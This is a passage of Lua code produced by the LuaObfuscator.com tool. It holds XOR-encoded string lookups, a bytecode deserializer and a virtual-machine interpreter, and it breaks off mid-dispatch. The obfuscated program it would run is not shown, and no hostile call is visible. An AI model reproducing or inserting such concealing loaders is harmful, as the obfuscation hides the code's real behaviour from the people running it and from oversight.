--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v24, v25)
		local v26 = 0;
		local v27;
		while true do
			if (v26 == 1) then
				return v5(v27);
			end
			if (v26 == 0) then
				v27 = {};
				for v44 = 1, #v24 do
					v6(v27, v0(v4(v1(v2(v24, v44, v44 + 1)), v1(v2(v25, 1 + ((v44 - 1) % #v25), 1 + ((v44 - 1) % #v25) + 1))) % 256));
				end
				v26 = 1;
			end
		end
	end
	local v8 = _G[v7("\150\119\255\43\50\251\135\106", "\226\24\145\94\95\153")];
	local v9 = _G[v7("\164\233\223\29\219\73", "\215\157\173\116\181\46")][v7("\216\44\160\142", "\186\85\212\235\146")];
	local v10 = _G[v7("\75\214\147\31\240\62", "\56\162\225\118\158\89\142")][v7("\219\84\4\210", "\184\60\101\160\207\66")];
	local v11 = _G[v7("\175\37\144\117\178\54", "\220\81\226\28")][v7("\212\6\215", "\167\115\181\226\155\138")];
	local v12 = _G[v7("\213\246\48\238\82\124", "\166\130\66\135\60\27\17")][v7("\55\87\95\204", "\80\36\42\174\21")];
	local v13 = _G[v7("\105\90\2\62\116\73", "\26\46\112\87")][v7("\166\188\51", "\212\217\67\203\20\223\223\37")];
	local v14 = _G[v7("\198\187\143\164\215", "\178\218\237\200")][v7("\211\185\187\229\209\162", "\176\214\213\134")];
	local v15 = _G[v7("\77\245\175\186\209", "\57\148\205\214\180\200\54")][v7("\127\28\238\48\38\98", "\22\114\157\85\84")];
	local v16 = _G[v7("\165\197\223\27", "\200\164\171\115\164\61\150")][v7("\143\186\241\27\85", "\227\222\148\99\37")];
	local v17 = _G[v7("\254\54\70\84\243\247\37", "\153\83\50\50\150")] or function()
		return _ENV;
	end;
	local v18 = _G[v7("\94\88\98\126\25\103\170\89\92\116\127\25", "\45\61\22\19\124\19\203")];
	local v19 = _G[v7("\169\194\19\1\249", "\217\161\114\109\149\98\16")];
	local v20 = _G[v7("\103\23\44\61\127\168", "\20\114\64\88\28\220")];
	local v21 = _G[v7("\168\63\17\211\183\243", "\221\81\97\178\212\152\176")] or _G[v7("\14\204\229\17\254", "\122\173\135\125\155")][v7("\221\138\209\1\186\52", "\168\228\161\96\217\95\81")];
	local v22 = _G[v7("\67\212\223\59\81\45\82\201", "\55\187\177\78\60\79")];
	local function v23(v28, v29, ...)
		local v30 = 0;
		local v31;
		local v32;
		local v33;
		local v34;
		local v35;
		local v36;
		local v37;
		local v38;
		local v39;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v30 == 1) then
				v35 = nil;
				v36 = nil;
				v37 = nil;
				v38 = nil;
				v30 = 2;
			end
			if (2 == v30) then
				v39 = nil;
				v40 = nil;
				v41 = nil;
				v42 = nil;
				v30 = 3;
			end
			if (v30 == 0) then
				v31 = 0;
				v32 = nil;
				v33 = nil;
				v34 = nil;
				v30 = 1;
			end
			if (v30 == 3) then
				v43 = nil;
				while true do
					local v45 = 0;
					while true do
						if (v45 == 1) then
							if (v31 == 3) then
								local v46 = 0;
								while true do
									if (v46 == 2) then
										v31 = 4;
										break;
									end
									if (v46 == 1) then
										function v39(v52)
											local v53 = 0;
											local v54;
											local v55;
											local v56;
											while true do
												if (v53 == 0) then
													v54 = 0;
													v55 = nil;
													v53 = 1;
												end
												if (v53 == 1) then
													v56 = nil;
													while true do
														local v109 = 0;
														while true do
															if (0 == v109) then
																if (v54 == 2) then
																	local v119 = 0;
																	while true do
																		if (v119 == 0) then
																			v56 = {};
																			for v142 = 1, #v55 do
																				v56[v142] = v10(v9(v11(v55, v142, v142)));
																			end
																			v119 = 1;
																		end
																		if (v119 == 1) then
																			v54 = 3;
																			break;
																		end
																	end
																end
																if (v54 == (3 + 0)) then
																	return v14(v56);
																end
																v109 = 1;
															end
															if (v109 == 1) then
																if (v54 == 1) then
																	local v120 = 0;
																	while true do
																		if (v120 == 1) then
																			v54 = 1977 - (1913 + 62);
																			break;
																		end
																		if (v120 == 0) then
																			v55 = v11(v28, v32, (v32 + v52) - 1);
																			v32 = v32 + v52;
																			v120 = 1;
																		end
																	end
																end
																if (v54 == 0) then
																	local v121 = 0;
																	while true do
																		if (v121 == 1) then
																			v54 = 1 + 0;
																			break;
																		end
																		if (v121 == 0) then
																			v55 = nil;
																			if not v52 then
																				local v170 = 0;
																				local v171;
																				while true do
																					if (v170 == 0) then
																						v171 = 0;
																						while true do
																							if (v171 == (0 + 0)) then
																								v52 = v37();
																								if (v52 == (0 - 0)) then
																									return "";
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v121 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v40 = v37;
										v46 = 2;
									end
									if (v46 == 0) then
										function v38()
											local v57 = 0;
											local v58;
											local v59;
											local v60;
											local v61;
											local v62;
											local v63;
											local v64;
											while true do
												if (v57 == 0) then
													v58 = 0;
													v59 = nil;
													v57 = 1;
												end
												if (3 == v57) then
													v64 = nil;
													while true do
														local v110 = 0;
														while true do
															if (1 == v110) then
																if ((339 - (144 + 192)) == v58) then
																	local v122 = 0;
																	while true do
																		if (v122 == 0) then
																			if (v63 == 0) then
																				if (v62 == (216 - (42 + 174))) then
																					return v64 * ((697 + 230) - (214 + 713));
																				else
																					local v173 = 0;
																					local v174;
																					while true do
																						if (v173 == 0) then
																							v174 = 0;
																							while true do
																								if (v174 == 0) then
																									v63 = 1 + 0;
																									v61 = 0;
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																			elseif (v63 == 2047) then
																				return ((v62 == 0) and (v64 * (1 / 0))) or (v64 * NaN);
																			end
																			return v16(v64, v63 - 1023) * (v61 + (v62 / ((1 + 1) ^ (1556 - (363 + 1141)))));
																		end
																	end
																end
																if (v58 == (1580 - (1183 + 397))) then
																	local v123 = 0;
																	while true do
																		if (v123 == 0) then
																			v59 = v37();
																			v60 = v37();
																			v123 = 1;
																		end
																		if (1 == v123) then
																			v58 = 2 - 1;
																			break;
																		end
																	end
																end
																break;
															end
															if (v110 == 0) then
																if (v58 == (1 + 0)) then
																	local v124 = 0;
																	while true do
																		if (v124 == 0) then
																			v61 = 1;
																			v62 = (v34(v60, 1, 47 - 27) * ((570 - ((1569 - (373 + 829)) + (932 - (476 + 255)))) ^ (1162 - (369 + 761)))) + v59;
																			v124 = 1;
																		end
																		if (v124 == 1) then
																			v58 = 2 + 0;
																			break;
																		end
																	end
																end
																if ((2 - 0) == v58) then
																	local v125 = 0;
																	while true do
																		if (v125 == 1) then
																			v58 = 3 - 0;
																			break;
																		end
																		if (v125 == 0) then
																			v63 = v34(v60, 21, 31);
																			v64 = ((v34(v60, 60 - 28) == (239 - (64 + 174))) and -1) or (1 + 0);
																			v125 = 1;
																		end
																	end
																end
																v110 = 1;
															end
														end
													end
													break;
												end
												if (v57 == 2) then
													v62 = nil;
													v63 = nil;
													v57 = 3;
												end
												if (v57 == 1) then
													v60 = nil;
													v61 = nil;
													v57 = 2;
												end
											end
										end
										v39 = nil;
										v46 = 1;
									end
								end
							end
							if (v31 == 4) then
								local v47 = 0;
								while true do
									if (v47 == 2) then
										v31 = 5;
										break;
									end
									if (v47 == 0) then
										v41 = nil;
										function v41(...)
											return {...}, v20("#", ...);
										end
										v47 = 1;
									end
									if (1 == v47) then
										v42 = nil;
										function v42()
											local v65 = 0;
											local v66;
											local v67;
											local v68;
											local v69;
											local v70;
											local v71;
											local v72;
											while true do
												if (v65 == 0) then
													v66 = 0;
													v67 = nil;
													v65 = 1;
												end
												if (v65 == 1) then
													v68 = nil;
													v69 = nil;
													v65 = 2;
												end
												if (v65 == 2) then
													v70 = nil;
													v71 = nil;
													v65 = 3;
												end
												if (v65 == 3) then
													v72 = nil;
													while true do
														local v111 = 0;
														while true do
															if (0 == v111) then
																if (v66 == 2) then
																	local v126 = 0;
																	while true do
																		if (v126 == 0) then
																			for v144 = 1, v71 do
																				local v145 = 0;
																				local v146;
																				local v147;
																				local v148;
																				while true do
																					if (v145 == 1) then
																						v148 = nil;
																						while true do
																							if (v146 == 1) then
																								if (v147 == (1 + 0)) then
																									v148 = v35() ~= (0 + 0);
																								elseif (v147 == 2) then
																									v148 = v38();
																								elseif (v147 == 3) then
																									v148 = v39();
																								end
																								v72[v144] = v148;
																								break;
																							end
																							if (v146 == 0) then
																								local v179 = 0;
																								while true do
																									if (1 == v179) then
																										v146 = 1;
																										break;
																									end
																									if (v179 == 0) then
																										v147 = v35();
																										v148 = nil;
																										v179 = 1;
																									end
																								end
																							end
																						end
																						break;
																					end
																					if (v145 == 0) then
																						v146 = 0;
																						v147 = nil;
																						v145 = 1;
																					end
																				end
																			end
																			v70[880 - (282 + 595)] = v35();
																			v126 = 1;
																		end
																		if (v126 == 1) then
																			for v149 = 1, v37() do
																				local v150 = 0;
																				local v151;
																				local v152;
																				while true do
																					if (v150 == 0) then
																						v151 = 0;
																						v152 = nil;
																						v150 = 1;
																					end
																					if (v150 == 1) then
																						while true do
																							if (v151 == 0) then
																								v152 = v35();
																								if (v34(v152, 1638 - (1523 + 114), 1) == 0) then
																									local v185 = 0;
																									local v186;
																									local v187;
																									local v188;
																									local v189;
																									while true do
																										if (v185 == 1) then
																											v188 = nil;
																											v189 = nil;
																											v185 = 2;
																										end
																										if (2 == v185) then
																											while true do
																												if (v186 == 1) then
																													local v193 = 0;
																													while true do
																														if (v193 == 1) then
																															v186 = 2;
																															break;
																														end
																														if (0 == v193) then
																															v189 = {v36(),v36(),nil,nil};
																															if (v187 == (1270 - (226 + 1044))) then
																																local v199 = 0;
																																local v200;
																																while true do
																																	if (v199 == 0) then
																																		v200 = 0;
																																		while true do
																																			if (v200 == 0) then
																																				v189[12 - 9] = v36();
																																				v189[4] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															elseif (v187 == 1) then
																																v189[120 - (32 + 85)] = v37();
																															elseif (v187 == (2 + 0)) then
																																v189[1 + 2] = v37() - (2 ^ 16);
																															elseif (v187 == (960 - (892 + 65))) then
																																local v374 = 0;
																																local v375;
																																while true do
																																	if (v374 == 0) then
																																		v375 = 0;
																																		while true do
																																			if (v375 == 0) then
																																				v189[3] = v37() - (2 ^ 16);
																																				v189[4] = v36();
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															v193 = 1;
																														end
																													end
																												end
																												if (v186 == 2) then
																													local v194 = 0;
																													while true do
																														if (v194 == 1) then
																															v186 = 3;
																															break;
																														end
																														if (v194 == 0) then
																															if (v34(v188, 1, 1) == (2 - 1)) then
																																v189[2] = v72[v189[2]];
																															end
																															if (v34(v188, 3 - 1, 2) == 1) then
																																v189[3] = v72[v189[3]];
																															end
																															v194 = 1;
																														end
																													end
																												end
																												if (3 == v186) then
																													if (v34(v188, 3, 3) == 1) then
																														v189[4] = v72[v189[4]];
																													end
																													v67[v149] = v189;
																													break;
																												end
																												if (v186 == 0) then
																													local v196 = 0;
																													while true do
																														if (v196 == 0) then
																															v187 = v34(v152, 2 + 0, 3);
																															v188 = v34(v152, 5 - 1, 6);
																															v196 = 1;
																														end
																														if (v196 == 1) then
																															v186 = 1;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																										if (v185 == 0) then
																											v186 = 0;
																											v187 = nil;
																											v185 = 1;
																										end
																									end
																								end
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v66 = 3;
																			break;
																		end
																	end
																end
																if (v66 == 3) then
																	local v127 = 0;
																	while true do
																		if (0 == v127) then
																			for v153 = 1, v37() do
																				v68[v153 - (1 - 0)] = v42();
																			end
																			return v70;
																		end
																	end
																end
																v111 = 1;
															end
															if (v111 == 1) then
																if (v66 == 1) then
																	local v128 = 0;
																	while true do
																		if (v128 == 0) then
																			v70 = {v67,v68,nil,v69};
																			v71 = v37();
																			v128 = 1;
																		end
																		if (1 == v128) then
																			v72 = {};
																			v66 = 2;
																			break;
																		end
																	end
																end
																if (0 == v66) then
																	local v129 = 0;
																	while true do
																		if (v129 == 1) then
																			v69 = {};
																			v66 = 1;
																			break;
																		end
																		if (0 == v129) then
																			v67 = {};
																			v68 = {};
																			v129 = 1;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v47 = 2;
									end
								end
							end
							v45 = 2;
						end
						if (2 == v45) then
							if (2 == v31) then
								local v48 = 0;
								while true do
									if (1 == v48) then
										function v37()
											local v73 = 0;
											local v74;
											local v75;
											local v76;
											local v77;
											local v78;
											while true do
												if (v73 == 0) then
													v74 = 0;
													v75 = nil;
													v73 = 1;
												end
												if (v73 == 1) then
													v76 = nil;
													v77 = nil;
													v73 = 2;
												end
												if (v73 == 2) then
													v78 = nil;
													while true do
														local v112 = 0;
														while true do
															if (v112 == 0) then
																if (v74 == 0) then
																	local v130 = 0;
																	while true do
																		if (v130 == 0) then
																			v75, v76, v77, v78 = v9(v28, v32, v32 + (622 - (555 + (87 - 23))));
																			v32 = v32 + ((872 + 63) - (857 + (930 - (564 + 292))));
																			v130 = 1;
																		end
																		if (v130 == 1) then
																			v74 = 1 - 0;
																			break;
																		end
																	end
																end
																if (v74 == (2 - 1)) then
																	return (v78 * 16777216) + (v77 * 65536) + (v76 * (560 - (244 + 60))) + v75;
																end
																break;
															end
														end
													end
													break;
												end
											end
										end
										v38 = nil;
										v48 = 2;
									end
									if (v48 == 2) then
										v31 = 3;
										break;
									end
									if (v48 == 0) then
										function v36()
											local v79 = 0;
											local v80;
											local v81;
											local v82;
											while true do
												if (v79 == 1) then
													v82 = nil;
													while true do
														local v113 = 0;
														while true do
															if (0 == v113) then
																if (v80 == 0) then
																	local v131 = 0;
																	while true do
																		if (v131 == 0) then
																			v81, v82 = v9(v28, v32, v32 + 2);
																			v32 = v32 + (7 - 5);
																			v131 = 1;
																		end
																		if (v131 == 1) then
																			v80 = 1662 - (1477 + 184);
																			break;
																		end
																	end
																end
																if (v80 == 1) then
																	return (v82 * 256) + v81;
																end
																break;
															end
														end
													end
													break;
												end
												if (v79 == 0) then
													v80 = 0;
													v81 = nil;
													v79 = 1;
												end
											end
										end
										v37 = nil;
										v48 = 1;
									end
								end
							end
							if (v31 == 5) then
								local v49 = 0;
								while true do
									if (v49 == 1) then
										return v43(v42(), {}, v29)(...);
									end
									if (v49 == 0) then
										v43 = nil;
										function v43(v83, v84, v85)
											local v86 = 0;
											local v87;
											local v88;
											local v89;
											local v90;
											while true do
												if (v86 == 1) then
													v89 = nil;
													v90 = nil;
													v86 = 2;
												end
												if (2 == v86) then
													while true do
														local v114 = 0;
														while true do
															if (v114 == 0) then
																if (v87 == 1) then
																	local v132 = 0;
																	while true do
																		if (v132 == 0) then
																			v90 = v83[3];
																			return function(...)
																				local v155 = 0;
																				local v156;
																				local v157;
																				local v158;
																				local v159;
																				local v160;
																				local v161;
																				local v162;
																				local v163;
																				local v164;
																				local v165;
																				local v166;
																				local v167;
																				local v168;
																				local v169;
																				while true do
																					if (v155 == 2) then
																						v164 = v20("#", ...) - 1;
																						v165 = {};
																						v166 = {};
																						for v175 = 0, v164 do
																							if (v175 >= v158) then
																								v162[v175 - v158] = v163[v175 + 1];
																							else
																								v166[v175] = v163[v175 + 1];
																							end
																						end
																						v155 = 3;
																					end
																					if (v155 == 1) then
																						v160 = 1;
																						v161 = -1;
																						v162 = {};
																						v163 = {...};
																						v155 = 2;
																					end
																					if (v155 == 3) then
																						v167 = (v164 - v158) + 1;
																						v168 = nil;
																						v169 = nil;
																						while true do
																							local v176 = 0;
																							local v177;
																							while true do
																								if (v176 == 0) then
																									v177 = 0;
																									while true do
																										if (v177 == 0) then
																											local v190 = 0;
																											while true do
																												if (v190 == 1) then
																													v177 = 1;
																													break;
																												end
																												if (v190 == 0) then
																													v168 = v156[v160];
																													v169 = v168[1];
																													v190 = 1;
																												end
																											end
																										end
																										if (v177 == 1) then
																											if (v169 <= 34) then
																												if (v169 <= 16) then
																													if (v169 <= 7) then
																														if (v169 <= 3) then
																															if (v169 <= 1) then
																																if (v169 > (180 - (67 + 113))) then
																																	v166[v168[2 + 0]] = v84[v168[3]];
																																else
																																	v85[v168[7 - 4]] = v166[v168[2]];
																																end
																															elseif (v169 == 2) then
																																local v210 = 0;
																																local v211;
																																local v212;
																																while true do
																																	if (v210 == 1) then
																																		while true do
																																			if (v211 == 0) then
																																				v212 = v168[2];
																																				do
																																					return v166[v212](v21(v166, v212 + 1 + 0, v168[3]));
																																				end
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																	if (v210 == 0) then
																																		v211 = 0;
																																		v212 = nil;
																																		v210 = 1;
																																	end
																																end
																															else
																																v166[v168[2]] = v168[3] ~= 0;
																															end
																														elseif (v169 <= 5) then
																															if (v169 == 4) then
																																v166[v168[7 - 5]] = v166[v168[3]][v168[4]];
																															else
																																v166[v168[954 - (802 + 150)]] = v166[v168[3]] % v166[v168[4]];
																															end
																														elseif (v169 > 6) then
																															local v217 = 0;
																															local v218;
																															local v219;
																															local v220;
																															local v221;
																															local v222;
																															while true do
																																if (v217 == 2) then
																																	v222 = nil;
																																	while true do
																																		if (v218 == 1) then
																																			local v378 = 0;
																																			while true do
																																				if (v378 == 1) then
																																					v218 = 2;
																																					break;
																																				end
																																				if (0 == v378) then
																																					v161 = (v221 + v219) - (1 - 0);
																																					v222 = 0;
																																					v378 = 1;
																																				end
																																			end
																																		end
																																		if (v218 == 2) then
																																			for v417 = v219, v161 do
																																				local v418 = 0;
																																				local v419;
																																				while true do
																																					if (v418 == 0) then
																																						v419 = 0;
																																						while true do
																																							if (v419 == 0) then
																																								v222 = v222 + 1;
																																								v166[v417] = v220[v222];
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			break;
																																		end
																																		if (v218 == 0) then
																																			local v379 = 0;
																																			while true do
																																				if (v379 == 0) then
																																					v219 = v168[5 - 3];
																																					v220, v221 = v159(v166[v219](v166[v219 + 1]));
																																					v379 = 1;
																																				end
																																				if (1 == v379) then
																																					v218 = 1;
																																					break;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v217 == 0) then
																																	v218 = 0;
																																	v219 = nil;
																																	v217 = 1;
																																end
																																if (v217 == 1) then
																																	v220 = nil;
																																	v221 = nil;
																																	v217 = 2;
																																end
																															end
																														else
																															v166[v168[2]][v166[v168[3]]] = v166[v168[4]];
																														end
																													elseif (v169 <= 11) then
																														if (v169 <= 9) then
																															if (v169 > 8) then
																																for v337 = v168[2], v168[3] do
																																	v166[v337] = nil;
																																end
																															else
																																local v225 = 0;
																																local v226;
																																local v227;
																																local v228;
																																local v229;
																																local v230;
																																while true do
																																	if (v225 == 1) then
																																		v228 = nil;
																																		v229 = nil;
																																		v225 = 2;
																																	end
																																	if (0 == v225) then
																																		v226 = 0;
																																		v227 = nil;
																																		v225 = 1;
																																	end
																																	if (2 == v225) then
																																		v230 = nil;
																																		while true do
																																			if (0 == v226) then
																																				local v380 = 0;
																																				while true do
																																					if (1 == v380) then
																																						v226 = 1;
																																						break;
																																					end
																																					if (v380 == 0) then
																																						v227 = v168[2];
																																						v228, v229 = v159(v166[v227](v21(v166, v227 + 1, v168[3])));
																																						v380 = 1;
																																					end
																																				end
																																			end
																																			if (v226 == 2) then
																																				for v420 = v227, v161 do
																																					local v421 = 0;
																																					local v422;
																																					while true do
																																						if (v421 == 0) then
																																							v422 = 0;
																																							while true do
																																								if (v422 == 0) then
																																									v230 = v230 + 1;
																																									v166[v420] = v228[v230];
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																				break;
																																			end
																																			if (v226 == 1) then
																																				local v381 = 0;
																																				while true do
																																					if (v381 == 0) then
																																						v161 = (v229 + v227) - 1;
																																						v230 = 0 + 0;
																																						v381 = 1;
																																					end
																																					if (v381 == 1) then
																																						v226 = 2;
																																						break;
																																					end
																																				end
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																														elseif (v169 == 10) then
																															v166[v168[999 - (915 + 82)]] = v166[v168[3]] + v168[4];
																														else
																															do
																																return;
																															end
																														end
																													elseif (v169 <= 13) then
																														if (v169 == 12) then
																															v166[v168[2]] = v166[v168[8 - 5]] % v166[v168[4]];
																														else
																															v166[v168[2]] = v166[v168[3]] + v168[4];
																														end
																													elseif (v169 <= 14) then
																														local v234 = 0;
																														local v235;
																														local v236;
																														local v237;
																														local v238;
																														while true do
																															if (v234 == 1) then
																																v237 = nil;
																																v238 = nil;
																																v234 = 2;
																															end
																															if (2 == v234) then
																																while true do
																																	if (v235 == 0) then
																																		local v382 = 0;
																																		while true do
																																			if (v382 == 0) then
																																				v236 = v168[2];
																																				v237 = v166[v236];
																																				v382 = 1;
																																			end
																																			if (v382 == 1) then
																																				v235 = 1;
																																				break;
																																			end
																																		end
																																	end
																																	if (v235 == 1) then
																																		v238 = v166[v236 + 2 + 0];
																																		if (v238 > 0) then
																																			if (v237 > v166[v236 + (1 - 0)]) then
																																				v160 = v168[3];
																																			else
																																				v166[v236 + 3] = v237;
																																			end
																																		elseif (v237 < v166[v236 + 1]) then
																																			v160 = v168[3];
																																		else
																																			v166[v236 + 3] = v237;
																																		end
																																		break;
																																	end
																																end
																																break;
																															end
																															if (v234 == 0) then
																																v235 = 0;
																																v236 = nil;
																																v234 = 1;
																															end
																														end
																													elseif (v169 == 15) then
																														v166[v168[2]] = v166[v168[3]] - v168[4];
																													else
																														v160 = v168[3];
																													end
																												elseif (v169 <= 25) then
																													if (v169 <= 20) then
																														if (v169 <= 18) then
																															if (v169 == 17) then
																																if not v166[v168[1189 - (1069 + 118)]] then
																																	v160 = v160 + 1;
																																else
																																	v160 = v168[3];
																																end
																															else
																																v166[v168[2]] = v168[3] + v166[v168[4]];
																															end
																														elseif (v169 > 19) then
																															v166[v168[2]] = {};
																														else
																															local v241 = 0;
																															local v242;
																															local v243;
																															while true do
																																if (v241 == 0) then
																																	v242 = 0;
																																	v243 = nil;
																																	v241 = 1;
																																end
																																if (v241 == 1) then
																																	while true do
																																		if (v242 == 0) then
																																			v243 = v168[2];
																																			do
																																				return v21(v166, v243, v161);
																																			end
																																			break;
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													elseif (v169 <= 22) then
																														if (v169 > 21) then
																															local v244 = 0;
																															local v245;
																															local v246;
																															local v247;
																															local v248;
																															while true do
																																if (v244 == 0) then
																																	v245 = 0;
																																	v246 = nil;
																																	v244 = 1;
																																end
																																if (v244 == 1) then
																																	v247 = nil;
																																	v248 = nil;
																																	v244 = 2;
																																end
																																if (v244 == 2) then
																																	while true do
																																		if (v245 == 1) then
																																			local v385 = 0;
																																			while true do
																																				if (v385 == 0) then
																																					v248 = v166[v246] + v247;
																																					v166[v246] = v248;
																																					v385 = 1;
																																				end
																																				if (v385 == 1) then
																																					v245 = 2;
																																					break;
																																				end
																																			end
																																		end
																																		if (v245 == 2) then
																																			if (v247 > 0) then
																																				if (v248 <= v166[v246 + 1]) then
																																					local v474 = 0;
																																					local v475;
																																					while true do
																																						if (0 == v474) then
																																							v475 = 0;
																																							while true do
																																								if (v475 == 0) then
																																									v160 = v168[3];
																																									v166[v246 + 3] = v248;
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																			elseif (v248 >= v166[v246 + (2 - 1)]) then
																																				local v476 = 0;
																																				local v477;
																																				while true do
																																					if (v476 == 0) then
																																						v477 = 0;
																																						while true do
																																							if (v477 == 0) then
																																								v160 = v168[3];
																																								v166[v246 + 3] = v248;
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			end
																																			break;
																																		end
																																		if (v245 == 0) then
																																			local v386 = 0;
																																			while true do
																																				if (v386 == 1) then
																																					v245 = 1;
																																					break;
																																				end
																																				if (v386 == 0) then
																																					v246 = v168[2];
																																					v247 = v166[v246 + 2];
																																					v386 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																														else
																															v166[v168[3 - 1]] = #v166[v168[3]];
																														end
																													elseif (v169 <= 23) then
																														v166[v168[2]][v166[v168[3]]] = v168[4];
																													elseif (v169 == 24) then
																														do
																															return;
																														end
																													else
																														v166[v168[2]] = v168[3] ~= 0;
																													end
																												elseif (v169 <= 29) then
																													if (v169 <= 27) then
																														if (v169 > 26) then
																															v166[v168[1 + 1]] = v166[v168[3]][v168[6 - 2]];
																														else
																															v166[v168[2]][v166[v168[3 + 0]]] = v168[4];
																														end
																													elseif (v169 > 28) then
																														local v256 = 0;
																														local v257;
																														local v258;
																														local v259;
																														local v260;
																														while true do
																															if (1 == v256) then
																																v259 = nil;
																																v260 = nil;
																																v256 = 2;
																															end
																															if (v256 == 2) then
																																while true do
																																	if (v257 == 0) then
																																		local v387 = 0;
																																		while true do
																																			if (0 == v387) then
																																				v258 = v157[v168[3]];
																																				v259 = nil;
																																				v387 = 1;
																																			end
																																			if (v387 == 1) then
																																				v257 = 1;
																																				break;
																																			end
																																		end
																																	end
																																	if (v257 == 2) then
																																		for v423 = 1, v168[4] do
																																			local v424 = 0;
																																			local v425;
																																			local v426;
																																			while true do
																																				if (v424 == 0) then
																																					v425 = 0;
																																					v426 = nil;
																																					v424 = 1;
																																				end
																																				if (v424 == 1) then
																																					while true do
																																						if (v425 == 1) then
																																							if (v426[1] == 43) then
																																								v260[v423 - 1] = {v166,v426[3]};
																																							else
																																								v260[v423 - 1] = {v84,v426[9 - 6]};
																																							end
																																							v165[#v165 + 1] = v260;
																																							break;
																																						end
																																						if (v425 == 0) then
																																							local v518 = 0;
																																							while true do
																																								if (v518 == 1) then
																																									v425 = 1;
																																									break;
																																								end
																																								if (v518 == 0) then
																																									v160 = v160 + 1;
																																									v426 = v156[v160];
																																									v518 = 1;
																																								end
																																							end
																																						end
																																					end
																																					break;
																																				end
																																			end
																																		end
																																		v166[v168[2]] = v43(v258, v259, v85);
																																		break;
																																	end
																																	if (1 == v257) then
																																		local v389 = 0;
																																		while true do
																																			if (v389 == 1) then
																																				v257 = 2;
																																				break;
																																			end
																																			if (v389 == 0) then
																																				v260 = {};
																																				v259 = v18({}, {[v7("\17\187\72\86\42\129\89", "\78\228\33\56")]=function(v478, v479)
																																					local v480 = 0;
																																					local v481;
																																					local v482;
																																					while true do
																																						if (v480 == 0) then
																																							v481 = 0;
																																							v482 = nil;
																																							v480 = 1;
																																						end
																																						if (v480 == 1) then
																																							while true do
																																								if (v481 == 0) then
																																									local v538 = 0;
																																									while true do
																																										if (v538 == 0) then
																																											v482 = v260[v479];
																																											return v482[1][v482[2]];
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end,[v7("\186\241\112\183\20\140\192\122\183\27", "\229\174\30\210\99")]=function(v483, v484, v485)
																																					local v486 = 0;
																																					local v487;
																																					local v488;
																																					while true do
																																						if (v486 == 0) then
																																							v487 = 0;
																																							v488 = nil;
																																							v486 = 1;
																																						end
																																						if (v486 == 1) then
																																							while true do
																																								if (0 == v487) then
																																									v488 = v260[v484];
																																									v488[1][v488[2]] = v485;
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end});
																																				v389 = 1;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																															if (v256 == 0) then
																																v257 = 0;
																																v258 = nil;
																																v256 = 1;
																															end
																														end
																													else
																														v166[v168[20 - (10 + 8)]] = v84[v168[11 - 8]];
																													end
																												elseif (v169 <= 31) then
																													if (v169 == 30) then
																														v166[v168[2]] = v168[3] + v166[v168[4]];
																													else
																														v166[v168[2]] = v85[v168[3]];
																													end
																												elseif (v169 <= 32) then
																													v166[v168[2]] = v166[v168[3]][v166[v168[4]]];
																												elseif (v169 == 33) then
																													if (v166[v168[444 - (416 + 26)]] == v168[4]) then
																														v160 = v160 + 1;
																													else
																														v160 = v168[3];
																													end
																												else
																													local v345 = 0;
																													local v346;
																													local v347;
																													local v348;
																													local v349;
																													local v350;
																													while true do
																														if (0 == v345) then
																															v346 = 0;
																															v347 = nil;
																															v345 = 1;
																														end
																														if (v345 == 2) then
																															v350 = nil;
																															while true do
																																if (v346 == 2) then
																																	for v455 = v347, v161 do
																																		local v456 = 0;
																																		local v457;
																																		while true do
																																			if (v456 == 0) then
																																				v457 = 0;
																																				while true do
																																					if (v457 == 0) then
																																						v350 = v350 + 1;
																																						v166[v455] = v348[v350];
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	break;
																																end
																																if (v346 == 1) then
																																	local v437 = 0;
																																	while true do
																																		if (v437 == 1) then
																																			v346 = 2;
																																			break;
																																		end
																																		if (v437 == 0) then
																																			v161 = (v349 + v347) - 1;
																																			v350 = 0;
																																			v437 = 1;
																																		end
																																	end
																																end
																																if (v346 == 0) then
																																	local v438 = 0;
																																	while true do
																																		if (v438 == 0) then
																																			v347 = v168[2];
																																			v348, v349 = v159(v166[v347](v21(v166, v347 + 1, v161)));
																																			v438 = 1;
																																		end
																																		if (v438 == 1) then
																																			v346 = 1;
																																			break;
																																		end
																																	end
																																end
																															end
																															break;
																														end
																														if (v345 == 1) then
																															v348 = nil;
																															v349 = nil;
																															v345 = 2;
																														end
																													end
																												end
																											elseif (v169 <= 51) then
